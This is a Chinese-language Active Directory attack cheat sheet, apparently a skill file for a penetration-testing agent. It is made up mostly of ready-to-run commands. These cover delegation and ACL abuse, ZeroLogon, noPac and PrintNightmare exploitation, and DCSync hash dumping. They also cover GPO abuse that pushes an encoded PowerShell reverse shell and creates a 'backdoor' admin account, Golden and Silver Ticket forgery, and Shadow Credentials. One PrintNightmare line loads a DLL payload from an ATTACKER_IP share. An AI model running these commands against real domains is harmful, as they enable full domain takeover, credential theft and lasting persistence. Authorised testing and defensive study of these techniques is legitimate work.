# AD 域提权、委派攻击与持久化

## 委派攻击

### 非约束委派
委派主机可以代替任何用户向任何服务认证。诱导域管连接到委派主机 → 获取域管 TGT。
```bash
# 查找非约束委派主机
impacket-findDelegation DOMAIN/USER:PASS -dc-ip DC_IP
# 或 netexec ldap DC_IP -u USER -p PASS -M find-delegation
```

### 约束委派
服务可以代替用户向指定服务认证。如果控制了约束委派服务 → 可以模拟任意用户访问目标服务。
```bash
impacket-getST -spn TARGET_SPN -impersonate administrator DOMAIN/SERVICE_USER:PASS -dc-ip DC_IP
```

### 基于资源的约束委派 (RBCD)
如果你能修改目标的 `msDS-AllowedToActOnBehalfOfOtherIdentity` 属性：
```bash
# 添加一个你控制的机器账户
impacket-addcomputer DOMAIN/USER:PASS -computer-name 'FAKE$' -computer-pass 'Password123!'
# 设置 RBCD
impacket-rbcd DOMAIN/USER:PASS -delegate-from 'FAKE$' -delegate-to TARGET$ -action write -dc-ip DC_IP
# 获取票据
impacket-getST -spn cifs/TARGET -impersonate administrator DOMAIN/'FAKE$':'Password123!' -dc-ip DC_IP
```

## ACL 滥用

BloodHound 中常见的危险 ACL 路径：
| 权限 | 可以做什么 |
|------|-----------|
| GenericAll | 重置密码、修改组成员、设置 RBCD |
| GenericWrite | 修改属性（设置 SPN → Kerberoasting） |
| WriteDACL | 给自己授予 GenericAll |
| WriteOwner | 修改对象所有者 → 再修改 DACL |
| ForceChangePassword | 直接重置目标密码 |
| AddMember | 将自己加入特权组 |

## ACL 滥用命令速查
```bash
# GenericAll on User → 重置密码
net rpc password USER newpass -U DOMAIN/ATTACKER%PASS -S DC_IP
# 或
rpcclient -U "DOMAIN/ATTACKER%PASS" DC_IP -c "setuserinfo2 TARGET_USER 23 'NewPass123!'"

# GenericAll on Group → 添加成员
net rpc group addmem "Domain Admins" ATTACKER -U DOMAIN/ATTACKER%PASS -S DC_IP

# WriteDACL → 授予自己 DCSync 权限
impacket-dacledit -action write -rights DCSync -principal ATTACKER -target-dn "DC=domain,DC=com" DOMAIN/ATTACKER:PASS -dc-ip DC_IP

# GenericWrite on User → 设置 SPN 后 Kerberoasting
python3 /pentest/targetedKerberoast/targetedKerberoast.py -u ATTACKER -p PASS -d DOMAIN --dc-ip DC_IP
```

## 其他提权路径
- **LAPS**：`netexec ldap DC_IP -u USER -p PASS -M laps` — 读取本地管理员密码
- **GPP 密码**：`netexec smb DC_IP -u USER -p PASS -M gpp_password` — 组策略中的密码
- **ADCS 攻击**：→ `/skill:adcs-certipy-attack` — 证书服务滥用（ESC1-ESC11）
- **NTLM Relay**：→ `/skill:ntlm-relay-attack` — 中继攻击获取域控

## 域控攻击

### DCSync
需要域管权限或 Replicating Directory Changes 权限：
```bash
impacket-secretsdump DOMAIN/ADMIN:PASS@DC_IP -just-dc
# 获取所有用户的 NTLM 哈希，包括 krbtgt
```

### ZeroLogon (CVE-2020-1472)
将域控机器密码重置为空，直接获取域管权限。影响所有未打补丁的 Windows Server。
```bash
# 检测（工具路径: /pentest/CVE-2020-1472/）
python3 /pentest/CVE-2020-1472/zerologon_tester.py DC_HOSTNAME DC_IP

# 利用（危险！会破坏域控密码，需要恢复）
python3 /pentest/CVE-2020-1472/cve-2020-1472-exploit.py DC_HOSTNAME DC_IP

# 利用后 dump 域内所有哈希
impacket-secretsdump -no-pass -just-dc DOMAIN/DC_HOSTNAME\$@DC_IP

# ⚠️ 必须恢复域控密码！否则域复制会中断
impacket-restorepassword DOMAIN/DC_HOSTNAME@DC_HOSTNAME -target-ip DC_IP \
  -hexpass ORIGINAL_HEX_PASSWORD
```

### noPac (CVE-2021-42278/42287)
普通域用户直接提升为域管。利用机器账户名称欺骗 + S4U2self。
```bash
# 一键利用（工具路径: /pentest/noPac/）
python3 /pentest/noPac/noPac.py DOMAIN/USER:PASS -dc-ip DC_IP -dc-host DC_HOSTNAME --impersonate administrator -dump
# 或获取 shell
python3 /pentest/noPac/noPac.py DOMAIN/USER:PASS -dc-ip DC_IP -dc-host DC_HOSTNAME --impersonate administrator -shell
```

### PrintNightmare (CVE-2021-1675 / CVE-2021-34527)
```bash
# 远程 RCE（需要 SMB 共享托管 DLL）
python3 CVE-2021-1675.py DOMAIN/USER:PASS@DC_IP '\\ATTACKER_IP\share\payload.dll'
```

### ADCS 攻击（ESC1-ESC11）
证书服务是目前域渗透中最强大的攻击面：
→ 完整 ADCS 攻击方法论 → `/skill:adcs-certipy-attack`

### NTLM Relay 到域控
→ 完整 NTLM 中继攻击 → `/skill:ntlm-relay-attack`

## GPO 滥用

如果对 GPO 有编辑权限，可以在域内所有关联 OU 的机器上执行命令：
```bash
# 检查 GPO 权限
# BloodHound: 搜索对 GPO 有 GenericWrite/WriteDACL 的用户

# SharpGPOAbuse（Windows）
SharpGPOAbuse.exe --AddComputerTask --TaskName "pwn" \
  --Author NT_AUTHORITY\SYSTEM --Command "cmd.exe" \
  --Arguments "/c net localgroup administrators USER /add" \
  --GPOName "VULNERABLE_GPO"

# pyGPOAbuse（Linux，工具路径: /pentest/pyGPOAbuse/）
python3 /pentest/pyGPOAbuse/pygpoabuse.py DOMAIN/USER:PASS -gpo-id "GPO_GUID" \
  -command "cmd.exe /c net localgroup administrators USER /add" \
  -dc-ip DC_IP
```

## 持久化

### Golden Ticket
```bash
# 需要 krbtgt 哈希（DCSync 获取）
impacket-secretsdump DOMAIN/admin:PASS@DC_IP -just-dc-user krbtgt

# 伪造 Golden Ticket
impacket-ticketer -nthash KRBTGT_HASH -domain-sid S-1-5-21-xxx \
  -domain DOMAIN administrator
export KRB5CCNAME=administrator.ccache
impacket-psexec -k -no-pass DOMAIN/administrator@DC_IP
```

### Silver Ticket
```bash
# 用服务账户 Hash 伪造特定服务票据（不经过域控）
impacket-ticketer -nthash SERVICE_HASH -domain-sid S-1-5-21-xxx \
  -domain DOMAIN -spn cifs/TARGET administrator
```

| 方法 | 条件 | 隐蔽性 |
|------|------|--------|
| Golden Ticket | krbtgt 哈希 | 高（10 年有效期） |
| Silver Ticket | 服务账户哈希 | 高（不经过域控） |
| DCSync 后门 | 域管权限 | 低（给用户加 DCSync 权限） |
| AdminSDHolder | 域管权限 | 中（60 分钟自动恢复 ACL） |
| 机器账户 | 域用户即可 | 高（RBCD 后门） |
| Shadow Credentials | 写 msDS-KeyCredentialLink | 高（证书认证） |
| Golden Certificate | CA 私钥 | 极高（伪造任意证书） |

## GPO 滥用 — gpowned

当拥有对 GPO 的写权限时，可通过 GPO 部署恶意计划任务/脚本：

```bash
# 检查当前用户对哪些 GPO 有写权限
bloodyAD -d DOMAIN -u USER -p PASS --host DC_IP get writable --otype gpo

# 通过 GPO 添加计划任务（反弹 shell）
python3 /pentest/pyGPOAbuse/pygpoabuse.py DOMAIN/USER:PASS \
  -gpo-id "GPO_GUID" -command "powershell -e BASE64_PAYLOAD" \
  -dc-ip DC_IP -f

# GPOwned — GPO 滥用另一个工具
python3 /pentest/GPOwned/GPOwned.py -u USER -p PASS -d DOMAIN -dc-ip DC_IP \
  -gpo-id "GPO_GUID" -command "net user backdoor P@ss /add && net localgroup administrators backdoor /add"
```

## Shadow Credentials — pywhisker

当拥有对目标用户/机器的 `msDS-KeyCredentialLink` 属性写权限时：

```bash
# 添加 Shadow Credentials（生成证书 + 修改 KeyCredentialLink）
python3 /pentest/pywhisker/pywhisker.py -d DOMAIN -u ATTACKER -p PASS \
  --target TARGET_USER --action add --dc-ip DC_IP

# 用生成的证书获取 TGT（配合 certipy 或 PKINITtools）
certipy auth -pfx TARGET_USER.pfx -dc-ip DC_IP
# 或
python3 /pentest/PKINITtools/gettgtpkinit.py -cert-pfx TARGET_USER.pfx \
  DOMAIN/TARGET_USER TARGET_USER.ccache

# 清理 Shadow Credentials
python3 /pentest/pywhisker/pywhisker.py -d DOMAIN -u ATTACKER -p PASS \
  --target TARGET_USER --action remove --device-id DEVICE_ID --dc-ip DC_IP
```
